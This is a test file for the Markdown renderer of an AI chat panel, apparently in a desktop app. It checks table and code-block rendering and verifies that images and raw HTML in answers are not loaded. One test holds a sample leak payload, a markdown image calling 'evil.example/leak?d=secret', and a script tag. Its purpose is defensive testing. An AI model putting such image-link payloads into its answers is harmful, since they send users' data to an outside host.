import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it, vi } from "vitest";
vi.mock("@tauri-apps/plugin-opener", () => ({ openUrl: vi.fn() }));
vi.mock("../../agent/assistant", () => ({ Assistant: class {} }));
vi.mock("../ipc", () => ({ fs: {}, http: {}, uid: () => "x" }));
import { Markdown } from "../../components/ChatPanel";

const html = (md: string) => renderToStaticMarkup(<Markdown text={md} />);

describe("Ask markdown", () => {
  it("renders the answer from the screenshot properly", () => {
    const out = html("**By category**\n\n| category | count | avg of price |\n| --- | --- | --- |\n| groceries | 15 | 6.04 |\n| beauty | 5 | 13.39 |\n\n1. first\n2. second\n\n- `brand` is missing");
    expect(out).toContain("<table>");
    expect(out).toContain("<th>category</th>");
    expect(out).toContain("<td>6.04</td>");
    expect(out).toContain("<ol>");
    expect(out).toContain("<code>brand</code>");
    expect(out).not.toContain("| --- |");
  });

  it("never loads images or raw HTML from answers", () => {
    const out = html('![x](https://evil.example/leak?d=secret)\n\n<img src="https://evil.example/a"><script>alert(1)</script>');
    expect(out).not.toMatch(/<img|<script/);
    expect(out).toContain("[image: x]");
  });

  it("keeps code blocks with a copy button", () => {
    const out = html("```bash\ncurl https://api.example.com\n```");
    expect(out).toContain("md-code");
    expect(out).toContain("curl https://api.example.com");
  });
});
